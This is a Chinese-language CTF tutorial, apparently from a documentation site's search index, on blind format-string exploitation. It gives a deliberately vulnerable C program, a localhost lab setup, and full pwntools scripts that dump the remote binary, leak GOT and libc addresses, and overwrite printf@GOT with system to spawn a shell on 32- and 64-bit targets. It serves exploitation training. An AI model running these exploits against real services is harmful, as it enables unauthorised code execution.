\u3002\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9 32 \u4f4d\u548c 64 \u4f4d\u5404\u4e0d\u76f8\u540c\uff1a 32 \u4f4d\uff1a\u4ece 0x8048000 \u5f00\u59cb\u6cc4\u9732 64 \u4f4d\uff1a\u4ece 0x400000 \u5f00\u59cb\u6cc4\u9732 \u4e0b\u9762\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u6cc4\u9732\u811a\u672c\uff0c\u7ed3\u5408\u6ce8\u89e3\u5206\u6790\u5982\u4f55\u5904\u7406\u4e0a\u9762\u63d0\u5230\u7684\u95ee\u9898\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin','wb') as f: f.write(text_seg) \u6ce8\u89e3 \uff1a 19-21 \u884c\uff1a\u5904\u7406\u65e0\u5173\u6cc4\u9732\u7684\u7a0b\u5e8f\u6d41\u7a0b\u540e\uff0c\u8fdb\u5165\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8f93\u5165\u72b6\u6001 24 \u884c\uff1a32 \u4f4d\u7cfb\u7edf\u52a0\u8f7d\u5730\u5740 9 \u884c\uff1a\"%9$s.TMP\" \u4e2d\u7684 .TMP \u65e2\u662f\u586b\u5145\u5bf9\u9f50\uff0c\u4e5f\u662f\u5206\u9694\u7b26\uff0c\u65b9\u4fbf\u540e\u9762\u5904\u7406\u6570\u636e 14 \u884c\uff1a\u4f7f\u7528binascii \u5c06\u6cc4\u6f0f\u51fa\u6765\u5b57\u7b26\u4e32\u6bcf\u4e00\u4e2a\u90fd\u4ece ascii \u8f6c\u6362\u4e3a \u5341\u516d\u8fdb\u5236\uff0c\u65b9\u4fbf\u663e\u793a 15 \u884c\uff1ar.recvrepeat(0.2) \u63a5\u53d7\u8fd4\u56de\u7684\u5783\u573e\u6570\u636e\uff0c\u65b9\u4fbf\u4e0b\u4e00\u8f6e\u7684\u8f93\u5165 30 \u884c\uff1a\u6cc4\u6f0f\u5730\u5740\u52a8\u6001\u589e\u52a0\uff0c\u5047\u5982\u6cc4\u6f0f 1 \u5b57\u8282\u5c31\u589e\u52a0 1 \uff1b\u6cc4\u6f0f 3 \u5b57\u8282\u5c31\u589e\u52a0 3 31-33 \u884c\uff1a\u5904\u7406\u6cc4\u6f0f\u957f\u5ea6\u4e3a 0 \uff0c\u4e5f\u5c31\u662f\u6570\u636e\u662f \\x00 \u7684\u60c5\u51b5\u3002\u5730\u5740\u589e\u52a0 1 \uff0c\u7a0b\u5e8f\u6570\u636e\u52a0 \\x00 \u8fd0\u884c\u4e4b\u540e\uff0c\u8010\u5fc3\u7b49\u5f85\u6cc4\u6f0f\u5b8c\u6210\u3002\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\u662f\u4e0d\u80fd\u8fd0\u884c\u7684\uff0c\u4f46\u53ef\u4ee5\u5728 ida \u8fdb\u8fc7\u5904\u7406\u53ef\u4ee5\u8fdb\u884c\u5206\u6790\u3001\u627e plt \u3001got.plt \u7b49\u3002 \u5c06\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048000 \uff08\u5f00\u59cb\u6cc4\u9732\u7684\u5730\u5740\uff09\uff1a \u53ef\u4ee5\u901a\u8fc7 shift+F12 \u67e5\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u7136\u540e\u76f4\u63a5 F5 \u53cd\u7f16\u8bd1\uff1a \u57fa\u672c\u7ed3\u6784\u5df2\u7ecf\u51fa\u6765\u4e86\uff0c\u76f2\u6253\u6ca1\u6709\u6e90\u4ee3\u7801\uff0c\u5c31\u9700\u8981\u6839\u636e\u4f20\u5165\u53c2\u6570\u53bb\u5224\u65ad\u54ea\u4e2a sub_xxx \u662f\u54ea\u4e2a\u51fd\u6570\u4e86\u3002\u6bd4\u5982\u8f93\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684 sub_8048490 \u5c31\u662f printf \u3002 \u4ece .text \u6bb5\u5f00\u59cb \u7a0b\u5e8f\u542f\u52a8\u8fc7\u7a0b\uff1a \u4ece _start \u51fd\u6570\u5f00\u59cb\u5c31\u662f .text \u6bb5\uff0c\u53ef\u4ee5\u5728 ida \u4e2d\u6253\u5f00\u4e00\u4e2a\u6b63\u5e38\u7684 binary \u89c2\u5bdf text \u6bb5\u5f00\u5934\u7b2c\u4e00\u4e2a\u51fd\u6570\u5c31\u662f _stat \uff1a\uff08\u56fe\u4e3a 32 \u4f4d\u7a0b\u5e8f\uff09 \u5148\u7528 %p \u6cc4\u9732\u51fa\u6808\u4e0a\u6570\u636e\uff0c\u627e\u5230\u4e24\u4e2a\u76f8\u540c\u5730\u5740\uff0c\u800c\u4e14\u8fd9\u4e2a\u5730\u5740\u5f88\u9760\u8fd1\u7a0b\u5e8f\u52a0\u8f7d\u521d\u5730\u5740\uff0832\u4f4d\uff1a0x8048000\uff1b64\u4f4d\uff1a0x400000\uff09\u3002\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import sys p = remote('127.0.0.1',10001) p.recv() p.sendline('nameaaa') p.recv() def where_is_start(ret_index=null): return_addr=0 for i in range(400): payload = '%%%d$p.TMP' % (i) p.sendline(payload) p.recvuntil('right:') val = p.recvuntil('.TMP') log.info(str(i*4)+' '+val.strip().ljust(10)) if(i*4==ret_index): return_addr=int(val.strip('.TMP').ljust(10)[2:],16) return return_addr p.recvrepeat(0.2) start_addr=where_is_start() \u6700\u540e\u5728\u504f\u79fb 1164 \u548c 1188 \u627e\u5230 text \u6bb5\u5730\u5740 0x8048510 \uff0c\u53ef\u4ee5\u5bf9\u6bd4\u4e0a\u56fe\uff0c\u4e0a\u56fe\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u622a\u56fe\uff1a \u6cc4\u9732\u811a\u672c\u548c\u524d\u9762\u4e00\u6837\u53ea\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u8d77\u59cb\u5730\u5740\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048510 #begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_text','wb') as f: f.write(text_seg) \u5c06\u6cc4\u9732\u6587\u4ef6\u653e\u5165 ida \u5206\u6790\uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048510 \uff08\u5f00\u59cb\u6cc4\u9732\u5730\u5740\uff09\uff1a \u627e\u5230 main \u51fd\u6570\u5728 0x0804860B \uff0c\u9700\u8981\u5c06\u8fd9\u90e8\u5206\u5b9a\u4e49\u4e3a\u51fd\u6570\u624d\u80fd\u53cd\u7f16\u8bd1\uff0c\u53f3\u952e\u5730\u5740\u9694\u58c1\u7684\u540d\u79f0 loc_804860B \uff0ccreat function \u3002 \u7ea2\u8272\u90e8\u5206\u5c31\u662f\u6ca1\u6709\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\uff0c\u540e\u9762\u8ddf\u7684\u5c31\u662f\u51fd\u6570 plt \u5730\u5740\u3002 \u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4e0d\u540c\uff0c\u7ed3\u5408\u5b9e\u9645\u4f7f\u7528\u3002 \u89e3\u9898\u6d41\u7a0b \u7740\u91cd\u8bb0\u5f55 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \uff0c\u4e0d\u4e00\u6b65\u4e00\u6b65\u5206\u6790\u8fd9\u9053\u9898\u76ee\u6f0f\u6d1e\uff08\u8be6\u7ec6\u5206\u6790\uff1a \u9ed8\u5c0f\u897f \u535a\u5ba2\uff09\u3002\u8fd9\u9053\u9898\u76ee\u601d\u8def\u662f\uff1a \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u901a\u8fc7\u6cc4\u9732 plt \u8868\u4e2d\u7684\u6307\u4ee4\u5185\u5bb9\u786e\u5b9a\u5bf9\u5e94\u7684 got.plt \u8868\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 got.plt \u8868\u5730\u5740\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 printf \u7684\u51fd\u6570\u5730\u5740\u786e\u5b9a libc \u57fa\u5740\uff0c\u4ece\u800c\u83b7\u5f97 system \u5730\u5740 \u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4efb\u610f\u5199\u529f\u80fd\u5c06 printf \u7684 got.plt \u8868\u4e2d\u7684\u5730\u5740\u4fee\u6539\u4e3a system \u7684\u5730\u5740 send \u5b57\u7b26\u4e32 \u201c/bin/sh\u201d \uff0c\u90a3\u4e48\u5728\u8c03\u7528 printf(\u201c/bin/sh\u201d) \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(\u201c/bin/sh;\u201d) \uff0c\u4ece\u800c\u6210\u529f\u83b7\u53d6shell \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u5c06\u6cc4\u9732\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \u4e2d\u5206\u6790\u83b7\u5f97\uff0c\u51fd\u6570\u540d\u540e\u534a\u622a\u5c31\u662f\u5730\u5740 0x8048490 \uff1a \u6cc4\u9732 got.plt \u548c\u6cc4\u9732\u7a0b\u5e8f payload \u9ad8\u5ea6\u76f8\u4f3c\uff1a payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) \u6ce8\u89e3\uff1a \u4e3a\u4ec0\u4e48\u63a5\u6536 'right:\\xff\\x25' \uff1f right: \u662f\u56fa\u5b9a\u56de\u663e\uff0c\\xff\\x25 \u662f\u65e0\u7528\u5b57\u8282\u7801\u3002\u5b9e\u9645\u4e0a 0x8048490 \u7684\u6c47\u7f16\u662f\u8fd9\u6837\u7684\uff1a pwndbg> pdisass 0x8048490 \u25ba 0x8048490 <printf@plt> jmp dword ptr [0x804a018] <0xf7e4d670> 0x8048496 <printf@plt+6> push 0x18 0x804849b <printf@plt+11> jmp 0x8048450 # \u5b57\u8282\u7801 pwndbg> x /20wx 0x8048490 0x8048490 <printf@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048490 \u6307\u5411\u662f\u4e00\u6761\u8df3\u8f6c got.plt \u6307\u4ee4\uff0c\u6211\u4eec\u9700\u8981\u5176\u4e2d\u8df3\u8f6c\u7684\u76ee\u6807\u5730\u5740\u3002\\xff\\x25 \u5c31\u662f\u8df3\u8f6c\u6307\u4ee4\u7684\u5b57\u8282\u7801\uff0c\u6211\u4eec\u5c31\u8981\u5148\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff0c\u7136\u540e\u518d\u63a5\u6536 4 \u5b57\u8282\u7684 got.plt \u5730\u5740\u3002 \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u6784\u9020\u65b9\u6cd5\u540c\u4e0a\uff0c\u4f46\u4e0d\u9700\u8981\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff1a payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4)) \u6cc4\u9732 libc \u57fa\u5740& system \u5730\u5740 \u9898\u76ee\u6ca1\u6709\u7ed9\u51fa libc \u3002\u4ece\u6cc4\u9732\u51fa\u6765\u7684 printf@got \u53bb libcdatabase \u67e5\u8be2\u5176\u4ed6\u51fd\u6570\u504f\u79fb\u3002 printf:0x00049670 system:0x0003ada0 \u4efb\u610f\u5199\u4fee\u6539 printf@got.plt payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload) exp #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x8048490 # name p.recv() p.sendline('nameaaa') p.recv() # leak printf@got.plt payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) log.info(\"printf_got_plt:\"+hex(printf_got_plt)) # leak printf@got payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4)) log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x00049670 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x0003ada0 log.info(\"system_addr:\"+hex(system_addr)) # overwrite payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload) p.sendline('/bin/sh\\x00') p.interactive() 64 \u4f4d\u5229\u7528\u624b\u6cd5 \u5b9e\u9a8c\u73af\u5883\u51c6\u5907 \u8fd8\u662f\u4f7f\u7528 32 \u4f4d\u7684\u4f8b\u9898\u6e90\u7801\uff0c\u7f16\u8bd1 64 \u4f4d\u7a0b\u5e8f\uff1a gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10000,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10000) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u3002 \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u586b\u5145 8 \u5b57\u8282\uff0c\u7136\u540e\u518d\u586b\u5165 %p \uff0c\u56de\u663e\u957f\u5ea6\u662f 8 \u5b57\u8282\u3002 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 8 \u3002 dump \u7a0b\u5e8f \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff0c\u6216\u8005\u4ece text \u6bb5\u5f00\u59cb\u53ef\u4ee5\u7684\u3002\u8fd9\u91cc\u4e0d\u518d\u627e text \u6bb5\u8d77\u59cb\u4f4d\u7f6e\uff0c\u76f4\u63a5\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\u6cc4\u9732\u3002\u4e24\u4e2a\u4f4d\u6570\u7a0b\u5e8f\u811a\u672c\u901a\u7528\u7684\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\u3002 64 \u4f4d\u7a0b\u5e8f\u52a0\u8f7d\u8d77\u59cb\u5730\u5740\u662f\uff1a0x400000 \uff0c\u4e0b\u9762\u662f\u5bf9\u6bd4\u56fe\uff1a \u811a\u672c\u8fd8\u662f\u90a3\u4e2a\u811a\u672c\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' #r = remote('127.0.0.1',10001) r = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('moxiaoxi') r.recv() # leak begin = 0x400000#0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_64','wb') as f: f.write(text_seg) ida \u52a0\u8f7d\u53c2\u6570\u5982\u56fe\uff1a \u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u8fd9\u91cc\u6ca1\u6709\u8bc6\u522b\u4e3a\u51fd\u6570\uff0c\u9700\u8981\u624b\u52a8\u521b\u5efa\u51fd\u6570\u3002\u5728 0x0400826 \u53f3\u952e creat function \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u53cd\u6c47\u7f16\u4e86\u3002 \u70b9\u8fdb printf@plt \uff0c\u91cc\u9762\u662f\u8df3\u8f6c\u5230 printf@got.plt \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u4ece ida \u77e5\u9053\u4e86\uff1a printf_plt = 0x4006B0 printf_got_plt = 0x601030 \u89e3\u9898\u601d\u8def\u4e0e 32 \u4f4d\u4e00\u81f4\uff0c\u5229\u7528\u811a\u672c\uff1a #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_64_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x4006B0 printf_got_plt = 0x601030 # name p.recv() p.sendline('moxiaoxi') p.recv() # leak printf@got payload = \"%9$s.TMP\" + p64(printf_got_plt+1) p.sendline(payload) p.recvuntil('right:') printf_got = u64(p.recv(5).ljust(7,'\\x00')+'\\x00')<<8 log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x055800 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x045390 log.info(\"system_addr:\"+hex(system_addr)) one = p64(system_addr)[:2] two = p64(system_addr>>16)[:2] payload = \"%9104c%12$hn%54293c%13$hn\" + 'a'*7 payload += p64(printf_got_plt) + p64(printf_got_plt+2) p.sendline(payload) p.recv() p.sendline('/bin/sh\\x00') p.interactive() \u66f4\u591a\u5b9e\u4f8b axb_2019_fmt32 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee axb_2019_fmt64 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee SuCTF2018 - lock2 \u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2 \u53c2\u8003 ctf-wiki leak me pwn-\u76f2\u6253","title":"Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#bilnd-","text":"","title":"Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_1","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u539f\u7406&\u5229\u7528 got & plt \u8c03\u7528\u5173\u7cfb \u7a0b\u5e8f\u7684\u4e00\u822c\u542f\u52a8\u8fc7\u7a0b","title":"\u53ef\u80fd\u9700\u8981\u63d0\u524d\u4e86\u89e3\u7684\u77e5\u8bc6"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_2","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 IDA \u5206\u6790\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u65e0\u9650\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u628a\u5728\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u7ed9 dump \u4e0b\u6765\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\uff08\u4e0d\u540c\u4f4d\u6570\u6709\u4e9b\u8bb8\u5dee\u522b\uff09 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528","title":"\u539f\u7406"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_3","text":"\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684 \u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684 \u80fd\u65e0\u9650\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e","title":"\u4f7f\u7528\u6761\u4ef6"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#32","text":"","title":"32 \u4f4d\u5229\u7528\u624b\u6cd5"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_4","text":"\u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a #include <stdio.h> #include <string.h> #include <unistd.h> int main(int argc, char *argv[]) { setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); int flag; char buf[1024]; FILE* f; puts(\"What's your name?\"); fgets(buf, 1024, stdin); printf(\"Hi, \"); printf(\"%s\",buf); putchar('\\n'); flag = 1; while (flag == 1){ puts(\"Do you want the flag?\"); memset(buf,'\\0',1024); read(STDIN_FILENO, buf, 100); if (!strcmp(buf, \"no\\n\")){ printf(\"I see. Good bye.\"); return 0; }else { printf(\"Your input isn't right:\"); printf(buf); printf(\"Please Try again!\\n\"); } fflush(stdout); } return 0; } \u7f16\u8bd1 32 \u4f4d\u6587\u4ef6\uff1a gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10001,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10001) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u60c5\u51b5\u3002","title":"\u5b9e\u9a8c\u73af\u5883\u51c6\u5907"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_5","text":"\u7528 %p \u770b\u770b\u7a0b\u5e8f\u56de\u663e\u8f93\u51fa\u7684\u957f\u5ea6\u662f\u591a\u5c11\uff0c\u4ee5\u6b64\u5224\u65ad\u7a0b\u5e8f\u7684\u4f4d\u6570\u3002\u8fd9\u91cc\u770b\u5230\u56de\u663e\u662f 4 \u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u662f 32 \u4f4d\u7a0b\u5e8f\u3002\u53ef\u4ee5\u518d\u591a\u6cc4\u9732\u51e0\u4e2a\uff0c\u90fd\u662f 4 \u5b57\u8282\uff08\u542b\uff09\u4ee5\u4e0b\u7684\uff0c\u786e\u5b9a\u4e3a 32 \u4f4d\u7a0b\u5e8f\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_6","text":"\u627e\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u4f1a\u7528\u5230\u3002\u7531\u4e8e\u6ca1\u6709 binary \u4e0d\u80fd\u901a\u8fc7\u8c03\u8bd5\u5206\u6790\u504f\u79fb\uff0c\u5c31\u91c7\u53d6\u8f93\u5165\u591a\u4e2a %p \u6cc4\u9732\u51fa\u504f\u79fb\u3002\u4e3a\u4e86\u5bb9\u6613\u8fa8\u8ba4\uff0c\u5b57\u7b26\u4e32\u5f00\u59cb\u5148\u586b\u5145 4 \u5b57\u8282 \u7684\u586b\u5145\uff0864\u4f4d8\u5b57\u8282\uff09\uff0c\u7136\u540e\u518d\u586b\u5165 %p \u3002 \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 7 \u3002","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#dump","text":"dump \u7a0b\u5e8f\u5e94\u8be5\u9009\u54ea\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a %n$s \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5730\u5740\uff0c\u8f93\u51fa\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 %n$p \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5185\u5bb9\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa \u6211\u4eec\u662f\u9700\u8981 dump \u7a0b\u5e8f\uff0c\u4e5f\u5c31\u662f\u60f3\u83b7\u53d6\u6211\u4eec\u6240\u7ed9\u5b9a\u5730\u5740\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u83b7\u53d6\u6211\u4eec\u7ed9\u5b9a\u7684\u5730\u5740\u3002\u6240\u4ee5\u5e94\u8be5\u7528 %n$s \u628a\u6211\u4eec\u7ed9\u5b9a\u5730\u5740\u5f53\u4f5c\u6307\u9488\uff0c\u8f93\u51fa\u7ed9\u5b9a\u5730\u5740\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u3002\u7ed3\u5408\u524d\u9762\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 7 \uff0cpayload \u5e94\u8be5\u4e3a\uff1a %9$s.TMP[addr] \u3002 \u6ce8\u610f \uff1a\u4f7f\u7528 %s 